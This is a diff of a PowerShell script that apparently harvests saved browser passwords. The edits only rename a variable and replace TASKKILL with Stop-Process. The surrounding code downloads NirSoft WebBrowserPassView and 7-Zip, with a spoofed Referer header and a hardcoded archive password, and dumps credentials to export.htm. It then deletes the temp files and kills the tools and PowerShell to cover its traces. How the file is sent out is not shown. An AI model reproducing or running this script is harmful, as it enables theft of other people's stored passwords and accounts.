@@ -1,13 +1,13 @@
-$tmpfolder = "C:\temp"
+$tmpFolder = "C:\temp"
 
 # Ensure the temporary folder is clean
-if (Test-Path $tmpfolder) { 
-    Remove-Item $tmpfolder -Recurse -Force -ErrorAction SilentlyContinue 
+if (Test-Path $tmpFolder) { 
+    Remove-Item $tmpFolder -Recurse -Force -ErrorAction SilentlyContinue 
 }
 
 # Create a new temporary folder
-New-Item -ItemType Directory -Path $tmpfolder | Out-Null
-Set-Location $tmpfolder
+New-Item -ItemType Directory -Path $tmpFolder | Out-Null
+Set-Location $tmpFolder
 
 Start-Sleep -Seconds 3
 
@@ -17,7 +17,7 @@ $wbpvZip = 'wbpv.zip'
 $sevenZipUrl = 'https://www.7-zip.org/a/7za920.zip'
 $sevenZipZip = '7z.zip'
 $extractionPassword = 'wbpv28821@'
-$filePath = Join-Path -Path $tmpfolder -ChildPath 'export.htm'
+$filePath = Join-Path -Path $tmpFolder -ChildPath 'export.htm'
 
 # Set referer header for web requests
 $refererHeader = @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'}
@@ -71,7 +71,7 @@ if (Test-Path $filePath) {
 
 # Clean up temporary files
 Remove-Item -Recurse -Force -Path 'C:\temp\*'
-TASKKILL /IM "WebBrowserPassView.exe"
-TASKKILL /IM "7z.exe"
-TASKKILL /IM "7za.exe"
-TASKKILL /IM "powershell.exe"
+Stop-Process -Name "WebBrowserPassView" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "7z" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "7za" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
